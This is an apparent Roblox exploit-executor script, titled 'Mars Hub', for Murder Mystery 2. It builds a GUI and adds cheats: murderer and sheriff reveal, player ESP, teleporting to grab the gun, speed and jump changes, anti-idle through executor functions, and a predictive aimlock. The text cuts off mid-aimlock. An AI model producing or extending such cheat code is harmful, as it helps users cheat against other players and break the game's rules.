G2L["77"]["TextSize"] = 14;
G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["77"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["77"]["BackgroundTransparency"] = 1;
G2L["77"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["77"]["Text"] = [[Box ESP (Broken)]];
G2L["77"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.boxesp.TextButton
G2L["78"] = Instance.new("TextButton", G2L["75"]);
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["AutoButtonColor"] = false;
G2L["78"]["TextSize"] = 14;
G2L["78"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[]];
G2L["78"]["Position"] = UDim2.new(0.89305, 0, 0.14858, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.boxesp.TextButton.UICorner
G2L["79"] = Instance.new("UICorner", G2L["78"]);
G2L["79"]["CornerRadius"] = UDim.new(0, 5);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.boxesp.TextButton.LocalScript
G2L["7a"] = Instance.new("LocalScript", G2L["78"]);
G2L["7a"]["Enabled"] = false;
G2L["7a"]["Disabled"] = true;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.boxesp.TextButton.ImageLabel
G2L["7b"] = Instance.new("ImageLabel", G2L["78"]);
G2L["7b"]["ZIndex"] = 0;
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["Image"] = [[rbxassetid://10709790644]];
G2L["7b"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["7b"]["Visible"] = false;
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.fov
G2L["7c"] = Instance.new("Frame", G2L["64"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(63, 63, 63);
G2L["7c"]["Size"] = UDim2.new(0, 374, 0, 43);
G2L["7c"]["Position"] = UDim2.new(0.01789, 0, 0.66717, 0);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["Name"] = [[fov]];
G2L["7c"]["BackgroundTransparency"] = 0.3;

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.fov.UICorner
G2L["7d"] = Instance.new("UICorner", G2L["7c"]);
G2L["7d"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.fov.TextLabel
G2L["7e"] = Instance.new("TextLabel", G2L["7c"]);
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7e"]["TextColor3"] = Color3.fromRGB(204, 204, 204);
G2L["7e"]["BackgroundTransparency"] = 1;
G2L["7e"]["Size"] = UDim2.new(0, 116, 0, 27);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Text"] = [[Field Of View]];
G2L["7e"]["Position"] = UDim2.new(0.019, 0, 0.2, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.fov.TextBox
G2L["7f"] = Instance.new("TextBox", G2L["7c"]);
G2L["7f"]["TextColor3"] = Color3.fromRGB(224, 224, 224);
G2L["7f"]["BorderSizePixel"] = 0;
G2L["7f"]["TextWrapped"] = true;
G2L["7f"]["TextSize"] = 14;
G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(77, 78, 78);
G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7f"]["Size"] = UDim2.new(0, 41, 0, 30);
G2L["7f"]["Position"] = UDim2.new(0.86364, 0, 0.15209, 0);
G2L["7f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7f"]["Text"] = [[]];

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.fov.TextBox.UICorner
G2L["80"] = Instance.new("UICorner", G2L["7f"]);
G2L["80"]["CornerRadius"] = UDim.new(0, 10);

-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.fov.TextBox.LocalScript
G2L["81"] = Instance.new("LocalScript", G2L["7f"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Drag
G2L["82"] = Instance.new("LocalScript", G2L["2"]);
G2L["82"]["Name"] = [[Drag]];

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement
G2L["83"] = Instance.new("Folder", G2L["2"]);
G2L["83"]["Name"] = [[SuggestionElement]];

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element
G2L["84"] = Instance.new("Frame", G2L["83"]);
G2L["84"]["Visible"] = false;
G2L["84"]["BorderSizePixel"] = 0;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["Size"] = UDim2.new(0, 391, 0, 251);
G2L["84"]["Position"] = UDim2.new(0.24517, 0, 0.04494, 0);
G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["Name"] = [[Element]];
G2L["84"]["BackgroundTransparency"] = 1;

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.TextLabel
G2L["85"] = Instance.new("TextLabel", G2L["84"]);
G2L["85"]["TextWrapped"] = true;
G2L["85"]["BorderSizePixel"] = 0;
G2L["85"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["85"]["TextSize"] = 16;
G2L["85"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["85"]["TextColor3"] = Color3.fromRGB(200, 200, 200);
G2L["85"]["BackgroundTransparency"] = 1;
G2L["85"]["Size"] = UDim2.new(0, 376, 0, 116);
G2L["85"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["85"]["Text"] = [[All suggestions are appreciated, this helps me out alot knowing what you would like to be added / removed / updated. Note that my discord server also has a suggestion forum you may use but feel free to suggest via the script as well! Please do not spam suggest and you will be perma blacklisted from Mars Hub.]];
G2L["85"]["Position"] = UDim2.new(0.01535, 0, 0.00398, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.TextBox
G2L["86"] = Instance.new("TextBox", G2L["84"]);
G2L["86"]["TextColor3"] = Color3.fromRGB(212, 212, 212);
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["TextWrapped"] = true;
G2L["86"]["TextSize"] = 14;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(53, 54, 54);
G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["86"]["Size"] = UDim2.new(0, 336, 0, 37);
G2L["86"]["Position"] = UDim2.new(0.06394, 0, 0.61355, 0);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Text"] = [[]];

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.TextBox.UICorner
G2L["87"] = Instance.new("UICorner", G2L["86"]);
G2L["87"]["CornerRadius"] = UDim.new(0, 12);

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.TextBox.UIStroke
G2L["88"] = Instance.new("UIStroke", G2L["86"]);
G2L["88"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["88"]["Thickness"] = 2;
G2L["88"]["Color"] = Color3.fromRGB(104, 104, 104);

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.TextButton
G2L["89"] = Instance.new("TextButton", G2L["84"]);
G2L["89"]["BorderSizePixel"] = 0;
G2L["89"]["TextSize"] = 20;
G2L["89"]["TextColor3"] = Color3.fromRGB(219, 219, 219);
G2L["89"]["BackgroundColor3"] = Color3.fromRGB(47, 48, 48);
G2L["89"]["FontFace"] = Font.new([[rbxassetid://12187373592]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["89"]["Size"] = UDim2.new(0, 161, 0, 36);
G2L["89"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["89"]["Text"] = [[Submit]];
G2L["89"]["Position"] = UDim2.new(0.289, 0, 0.82072, 0);

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.TextButton.UICorner
G2L["8a"] = Instance.new("UICorner", G2L["89"]);
G2L["8a"]["CornerRadius"] = UDim.new(0, 13);

-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.LocalScript
G2L["8b"] = Instance.new("LocalScript", G2L["84"]);


-- StarterGui.MurderMystery2.LocalScript
G2L["8c"] = Instance.new("LocalScript", G2L["1"]);


-- StarterGui.MurderMystery2.LocalScript
G2L["8d"] = Instance.new("LocalScript", G2L["1"]);


-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Settings.LocalScript
local function C_d()
local script = G2L["d"];
	local button = script.Parent
	local settingselement = button.Parent.Parent.SettingsElement.Element
	local visualselement = button.Parent.Parent.VisualElement.Element
	local hubelement = button.Parent.Parent.HubElement.Element
	local suggestelement = button.Parent.Parent.SuggestionElement.Element
	
	button.MouseButton1Click:Connect(function()
		if hubelement then
			hubelement.Visible = false
		end
	
		if visualselement then
			visualselement.Visible = false
		end
	
		if suggestelement then
			suggestelement.Visible = false
		end
	
		settingselement.Visible = true
	end)
	
end;
task.spawn(C_d);
-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Visuals.LocalScript
local function C_10()
local script = G2L["10"];
	local button = script.Parent
	local settingselement = button.Parent.Parent.SettingsElement.Element
	local visualselement = button.Parent.Parent.VisualElement.Element
	local hubelement = button.Parent.Parent.HubElement.Element
	local suggestelement = button.Parent.Parent.SuggestionElement.Element
	
	button.MouseButton1Click:Connect(function()
		if hubelement then
			hubelement.Visible = false
		end
	
		if settingselement then
			settingselement.Visible = false
		end
	
		if suggestelement then
			suggestelement.Visible = false
		end
	
		visualselement.Visible = true
	end)
	
end;
task.spawn(C_10);
-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Hub.LocalScript
local function C_13()
local script = G2L["13"];
	local button = script.Parent
	local settingselement = button.Parent.Parent.SettingsElement.Element
	local visualselement = button.Parent.Parent.VisualElement.Element
	local hubelement = button.Parent.Parent.HubElement.Element
	local suggestelement = button.Parent.Parent.SuggestionElement.Element
	
	button.MouseButton1Click:Connect(function()
		if visualselement then
			visualselement.Visible = false
		end
	
		if settingselement then
			settingselement.Visible = false
		end
	
		if suggestelement then
			suggestelement.Visible = false
		end
	
		hubelement.Visible = true
	end)
	
end;
task.spawn(C_13);
-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrembed.LocalScript
local function C_16()
local script = G2L["16"];
	local textlabel = script.Parent
	local plr = game:GetService("Players").LocalPlayer
	
	textlabel.Text = plr.Name
end;
task.spawn(C_16);
-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrembed.plrembed.LocalScript
local function C_18()
local script = G2L["18"];
	local textlabel = script.Parent
	local plruserid = game.Players.LocalPlayer.UserId
	
	textlabel.Text = plruserid
end;
task.spawn(C_18);
-- StarterGui.MurderMystery2.UIPlaceHolder.Side.plrimage.LocalScript
local function C_1b()
local script = G2L["1b"];
	local imagelabel = script.Parent
	local userId = game.Players.LocalPlayer.UserId
	
	local success, image = pcall(function()
		return game.Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size420x420)
	end)
	
	if success then
		imagelabel.Image = image
	end
end;
task.spawn(C_1b);
-- StarterGui.MurderMystery2.UIPlaceHolder.Side.Suggest.LocalScript
local function C_1e()
local script = G2L["1e"];
	local button = script.Parent
	local settingselement = button.Parent.Parent.SettingsElement.Element
	local visualselement = button.Parent.Parent.VisualElement.Element
	local hubelement = button.Parent.Parent.HubElement.Element
	local suggestelement = button.Parent.Parent.SuggestionElement.Element
	
	button.MouseButton1Click:Connect(function()
		if hubelement then
			hubelement.Visible = false
		end
	
		if visualselement then
			visualselement.Visible = false
		end
		
		if settingselement then
		settingselement.Visible = false
		end
		
		suggestelement.Visible = true
	end)
	
end;
task.spawn(C_1e);
-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.boostfps.TextButton.LocalScript
local function C_28()
local script = G2L["28"];
	local button = script.Parent
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button.ImageLabel
	local isBlue = false
	
	local RunService = game:GetService("RunService")
	local Terrain = workspace:FindFirstChildOfClass('Terrain')
	local Lighting = game:GetService("Lighting")
	
	local function applySettings()
		if Terrain then
			Terrain.WaterWaveSize = 0
			Terrain.WaterWaveSpeed = 0
			Terrain.WaterReflectance = 0
			Terrain.WaterTransparency = 0
		end
	
		Lighting.GlobalShadows = false
		Lighting.FogEnd = 9e9
	
		settings().Rendering.QualityLevel = 1
	
		for _, v in pairs(game:GetDescendants()) do
			if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
				v.Material = "Plastic"
				v.Reflectance = 0
			elseif v:IsA("Decal") then
				v.Transparency = 1
			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Lifetime = NumberRange.new(0)
			elseif v:IsA("Explosion") then
				v.BlastPressure = 1
				v.BlastRadius = 1
			end
		end
	
		for _, v in pairs(Lighting:GetDescendants()) do
			if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
				v.Enabled = false
			end
		end
	
		workspace.DescendantAdded:Connect(function(child)
			task.spawn(function()
				if child:IsA('ForceField') or child:IsA('Sparkles') or child:IsA('Smoke') or child:IsA('Fire') then
					RunService.Heartbeat:Wait()
					child:Destroy()
				end
			end)
		end)
	end
	
	local function revertSettings()
		if Terrain then
			Terrain.WaterWaveSize = 1
			Terrain.WaterWaveSpeed = 1
			Terrain.WaterReflectance = 0.2
			Terrain.WaterTransparency = 0.3
		end
	
		Lighting.GlobalShadows = true
		Lighting.FogEnd = 100000
	
		settings().Rendering.QualityLevel = 10
	
		for _, v in pairs(game:GetDescendants()) do
			if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
				v.Material = Enum.Material.SmoothPlastic
				v.Reflectance = 0.5
			elseif v:IsA("Decal") then
				v.Transparency = 0
			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
				v.Lifetime = NumberRange.new(1)
			elseif v:IsA("Explosion") then
				v.BlastPressure = 500
				v.BlastRadius = 10
			end
		end
	
		for _, v in pairs(Lighting:GetDescendants()) do
			if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
				v.Enabled = true
			end
		end
	end
	
	button.MouseButton1Click:Connect(function()
		if isBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
			revertSettings()
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true
			applySettings()
		end
		isBlue = not isBlue
	end)
	
end;
task.spawn(C_28);
-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.antiidle.TextButton.LocalScript
local function C_2f()
local script = G2L["2f"];
	local button = script.Parent
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button.ImageLabel
	local isBlue = false
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local VirtualUser = game:GetService("VirtualUser")
	local idledConnection = nil
	
	local function disableIdledConnections()
		local getconnections = getconnections or get_signal_cons
		if getconnections then
			for _, connection in pairs(getconnections(LocalPlayer.Idled)) do
				if connection.Disable then
					connection.Disable(connection)
				elseif connection.Disconnect then
					connection.Disconnect(connection)
				end
			end
		end
	end
	
	local function enableAntiIdle()
		disableIdledConnections()
		idledConnection = LocalPlayer.Idled:Connect(function()
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	end
	
	local function disableAntiIdle()
		if idledConnection then
			idledConnection:Disconnect()
			idledConnection = nil
		end
	end
	
	button.MouseButton1Click:Connect(function()
		if isBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
			disableAntiIdle()
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true
			enableAntiIdle()
		end
		isBlue = not isBlue
	end)
	
	-- Initially disable anti-idle
	disableAntiIdle()
	
end;
task.spawn(C_2f);
-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.globalshadows.TextButton.LocalScript
local function C_36()
local script = G2L["36"];
	local button = script.Parent
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button.ImageLabel
	local isBlue = false
	
	local Lighting = game:GetService("Lighting")
	
	button.MouseButton1Click:Connect(function()
		if isBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
			Lighting.GlobalShadows = true
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true
			Lighting.GlobalShadows = false
		end
		isBlue = not isBlue
	end)
	
	-- Initially set GlobalShadows to true
	Lighting.GlobalShadows = true
	
end;
task.spawn(C_36);
-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrwalkspeed.TextBox.LocalScript
local function C_3d()
local script = G2L["3d"];
	local textbox = script.Parent
	local plr = game.Players.LocalPlayer
	local character = plr.Character or plr.CharacterAdded:Wait()
	
	-- Function to update walkspeed
	local function updateWalkSpeed()
		local text = textbox.Text
		local number = tonumber(text)
	
		if number and number >= 1 and number <= 200 then
			character.Humanoid.WalkSpeed = number
		else
			character.Humanoid.WalkSpeed = 16 -- Reset to default if invalid input
		end
	
		textbox.Text = "" -- Clear the textbox
	end
	
	-- Connect the function to the FocusLost event
	textbox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			updateWalkSpeed()
		end
	end)
	
end;
task.spawn(C_3d);
-- StarterGui.MurderMystery2.UIPlaceHolder.SettingsElement.Element.plrjumppower.TextBox.LocalScript
local function C_43()
local script = G2L["43"];
	local textbox = script.Parent
	local plr = game.Players.LocalPlayer
	local character = plr.Character or plr.CharacterAdded:Wait()
	
	local function updateJump()
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			local text = textbox.Text
			local number = tonumber(text)
	
			if number and number >= 1 and number <= 200 then
				humanoid.JumpPower = number
			else
				humanoid.JumpPower = 50 
			end
		end
	
		textbox.Text = "" 
	end
	
	textbox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			updateJump()
		end
	end)
	
end;
task.spawn(C_43);
-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightmurderer.TextButton.LocalScript
local function C_4b()
local script = G2L["4b"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local isButtonBlue = false
	local button = script.Parent 
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button:FindFirstChild("ImageLabel")
	
	local highlighting = false
	local highlights = {}
	local knifeFound = false
	local murderer
	
	local function createHighlight(player)
		if player.Character and not highlights[player] then
			local highlight = Instance.new("Highlight")
			highlight.Adornee = player.Character
			highlight.FillColor = Color3.new(1, 0, 0)  -- Red color
			highlight.FillTransparency = 0.5
			highlight.OutlineTransparency = 0
			highlight.OutlineColor = Color3.new(1, 0, 0)  -- Red color
			highlight.Parent = player.Character
			highlights[player] = highlight
		end
	end
	
	local function removeHighlight(player)
		if highlights[player] then
			highlights[player]:Destroy()
			highlights[player] = nil
		end
	end
	
	local function checkForKnife(player)
		if player.Backpack:FindFirstChild("Knife") then
			murderer = player
			knifeFound = true
			createHighlight(player)
		end
	end
	
	local function onPlayerAdded(player)
		local function checkCharacter()
			if highlighting and not knifeFound then
				local connection
				connection = RunService.Heartbeat:Connect(function()
					if player.Parent then
						checkForKnife(player)
						if knifeFound then
							connection:Disconnect()
						end
					else
						connection:Disconnect()
					end
				end)
			end
		end
		checkCharacter()
		player.CharacterAdded:Connect(checkCharacter)
		player.AncestryChanged:Connect(function()
			removeHighlight(player)
		end)
	end
	
	local function onPlayerRemoving(player)
		removeHighlight(player)
	end
	
	local function toggleHighlighting(enable)
		highlighting = enable
		knifeFound = false
		murderer = nil
		if highlighting then
			for _, player in pairs(Players:GetPlayers()) do
				onPlayerAdded(player)
			end
			Players.PlayerAdded:Connect(onPlayerAdded)
			Players.PlayerRemoving:Connect(onPlayerRemoving)
		else
			for _, player in pairs(Players:GetPlayers()) do
				removeHighlight(player)
			end
		end
	end
	
	button.MouseButton1Click:Connect(function()
		if isButtonBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
			toggleHighlighting(false)
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true 
			toggleHighlighting(true)
		end
		isButtonBlue = not isButtonBlue
	end)
	
	
	
end;
task.spawn(C_4b);
-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightsheriff.TextButton.LocalScript
local function C_52()
local script = G2L["52"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local isButtonBlue = false
	local button = script.Parent 
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button:FindFirstChild("ImageLabel")
	
	local highlighting = false
	local highlights = {}
	local gunFound = false
	
	local function createHighlight(player, color)
		if player.Character and not highlights[player] then
			local highlight = Instance.new("Highlight")
			highlight.Adornee = player.Character
			highlight.FillColor = color
			highlight.FillTransparency = 0.5
			highlight.OutlineTransparency = 0
			highlight.OutlineColor = color
			highlight.Parent = player.Character
			highlights[player] = highlight
		end
	end
	
	local function removeHighlight(player)
		if highlights[player] then
			highlights[player]:Destroy()
			highlights[player] = nil
		end
	end
	
	local function checkForGun(player)
		if player.Backpack:FindFirstChild("Gun") then
			gunFound = true
			createHighlight(player, Color3.new(0, 0, 1))
		end
	end
	
	local function onPlayerAdded(player)
		local function checkCharacter()
			if highlighting and not gunFound then
				local connection
				connection = RunService.Heartbeat:Connect(function()
					if player.Parent then
						checkForGun(player)
						if gunFound then
							connection:Disconnect()
						end
					else
						connection:Disconnect()
					end
				end)
			end
		end
		checkCharacter()
		player.CharacterAdded:Connect(checkCharacter)
		player.AncestryChanged:Connect(function()
			removeHighlight(player)
		end)
	end
	
	local function onPlayerRemoving(player)
		removeHighlight(player)
	end
	
	local function toggleHighlighting(enable)
		highlighting = enable
		gunFound = false
		if highlighting then
			for _, player in pairs(Players:GetPlayers()) do
				onPlayerAdded(player)
			end
			Players.PlayerAdded:Connect(onPlayerAdded)
			Players.PlayerRemoving:Connect(onPlayerRemoving)
		else
			for _, player in pairs(Players:GetPlayers()) do
				removeHighlight(player)
			end
		end
	end
	
	button.MouseButton1Click:Connect(function()
		if isButtonBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
			toggleHighlighting(false)
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true 
			toggleHighlighting(true)
		end
		isButtonBlue = not isButtonBlue
	end)
	
	
end;
task.spawn(C_52);
-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.autograbgun.TextButton.LocalScript
local function C_59()
local script = G2L["59"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local localPlayer = Players.LocalPlayer
	local isButtonBlue = false
	local button = script.Parent
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button:FindFirstChild("ImageLabel")
	
	local function teleportToGunDrop()
		local gunDrop = workspace:WaitForChild("Normal"):WaitForChild("GunDrop", 10)
		if gunDrop then
			local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
			humanoidRootPart.CFrame = gunDrop.CFrame
		end
	end
	
	local function waitForGunDrop()
		while isButtonBlue do
			local normalModel = workspace:FindFirstChild("Normal")
			if normalModel then
				local gunDrop = normalModel:FindFirstChild("GunDrop")
				if gunDrop then
					teleportToGunDrop()
					return
				end
			end
			wait(3) 
		end
	end
	
	button.MouseButton1Click:Connect(function()
		if isButtonBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true
			spawn(waitForGunDrop) 
		end
		isButtonBlue = not isButtonBlue
	end)
	
end;
task.spawn(C_59);
-- StarterGui.MurderMystery2.UIPlaceHolder.HubElement.Element.highlightplayers.TextButton.LocalScript
local function C_60()
local script = G2L["60"];
	local Players = game:GetService("Players")
	
	local localPlayer = Players.LocalPlayer
	local isHighlightEnabled = false
	
	local function createHighlight(player)
		local highlight = Instance.new("Highlight")
		highlight.Adornee = player.Character
		highlight.FillColor = Color3.fromRGB(0, 255, 0)
		highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
		highlight.FillTransparency = 0.5
		highlight.OutlineTransparency = 0
		highlight.Parent = player.Character
		return highlight
	end
	
	local highlights = {}
	
	local function highlightPlayers()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= localPlayer and player.Character then
				highlights[player] = createHighlight(player)
			end
		end
	end
	
	local function clearHighlights()
		for _, highlight in pairs(highlights) do
			if highlight then
				highlight:Destroy()
			end
		end
		highlights = {}
	end
	
	local function onCharacterAdded(player)
		if isHighlightEnabled and player ~= localPlayer then
			highlights[player] = createHighlight(player)
		end
	end
	
	local function onPlayerAdded(player)
		player.CharacterAdded:Connect(function()
			onCharacterAdded(player)
		end)
	end
	
	local function onPlayerRemoving(player)
		if highlights[player] then
			highlights[player]:Destroy()
			highlights[player] = nil
		end
	end
	
	Players.PlayerAdded:Connect(onPlayerAdded)
	Players.PlayerRemoving:Connect(onPlayerRemoving)
	
	local button = script.Parent
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button:FindFirstChild("ImageLabel")
	
	button.MouseButton1Click:Connect(function()
		if isHighlightEnabled then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
			clearHighlights()
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true
			highlightPlayers()
		end
		isHighlightEnabled = not isHighlightEnabled
	end)
	
	for _, player in ipairs(Players:GetPlayers()) do
		onPlayerAdded(player)
		if player.Character then
			onCharacterAdded(player)
		end
	end
	
end;
task.spawn(C_60);
-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.aimlock.TextButton.LocalScript
local function C_6a()
local script = G2L["6a"];
	local button = script.Parent
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button.ImageLabel
	local isBlue = false
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer
	local Mouse = LocalPlayer:GetMouse()
	local CamlockState = false
	local Prediction = 0.2179695989
	local HorizontalPrediction = 0.147076110
	local VerticalPrediction = 0.187634856
	local XPrediction = 582
	local YPrediction = 568
	local Locked = false
	local textbox = button.Parent.TextBox
	getgenv().Key = "Q"
	
	function FindNearestEnemy()
		local ClosestDistance, ClosestPlayer = math.huge, nil
		local CenterPosition = Vector2.new(game:GetService("GuiService"):GetScreenResolution().X / 2, game:GetService("GuiService"):GetScreenResolution().Y / 2)
	
		for _, Player in ipairs(game:GetService("Players"):GetPlayers()) do
			if Player ~= LocalPlayer then
				local Character = Player.Character
				if Character and Character:FindFirstChild("HumanoidRootPart") and Character.Humanoid.Health > 0 then
					local Position, IsVisibleOnViewport = game:GetService("Workspace").CurrentCamera:WorldToViewportPoint(Character.HumanoidRootPart.Position)
					if IsVisibleOnViewport then
						local Distance = (CenterPosition - Vector2.new(Position.X, Position.Y)).Magnitude
						if Distance < ClosestDistance then
							ClosestPlayer = Character
							ClosestDistance = Distance
						end
					end
				end
			end
		end
	
		return ClosestPlayer
	end
	
	local enemy = nil
	local highlight = Instance.new("Highlight")
	highlight.FillColor = Color3.new(1, 0, 0)
	highlight.OutlineColor = Color3.new(1, 0, 0)
	highlight.FillTransparency = 0.5
	highlight.OutlineTransparency = 0
	
	RunService.Heartbeat:Connect(function()
		if CamlockState and enemy and enemy:FindFirstChild("HumanoidRootPart") then
			local camera = workspace.CurrentCamera
			local predictedPosition = enemy.HumanoidRootPart.Position + (enemy.HumanoidRootPart.Velocity * Prediction) + Vector3.new(HorizontalPrediction, VerticalPrediction, 0)
